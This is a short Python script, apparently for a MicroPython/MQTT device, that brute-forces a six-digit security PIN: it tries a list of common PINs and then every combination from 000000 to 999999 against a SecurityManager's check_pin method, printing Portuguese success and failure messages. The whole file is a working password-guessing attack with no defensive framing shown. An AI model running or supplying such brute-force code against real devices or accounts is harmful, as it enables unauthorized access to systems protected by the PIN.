from umqtt import MQTTClient
from security import SecurityManager

client = MQTTClient()
security = SecurityManager(client)

def bfa():

    common_pins = [
        "123456", "111111", "222222", "333333", "444444",
        "555555", "666666", "777777", "888888", "999999",
        "000000", "123123", "456456", "789789", "101010"
    ]

    possible_digits = "1234567890"

    for pin in common_pins:
        if test_password(security, pin):
            return

    for d1 in possible_digits:
        for d2 in possible_digits:
            for d3 in possible_digits:
                for d4 in possible_digits:
                    for d5 in possible_digits:
                        for d6 in possible_digits:
                            code = d1 + d2 + d3 + d4 + d5 + d6
                            if test_password(security, code):
                                return

def test_password(security, pin):
    if security.check_pin(pin):
        print(f"✅ Senha encontrada: {pin}")
        return True
    else:
        print(f"❌ Tentativa de senha {pin} falhou")
        return False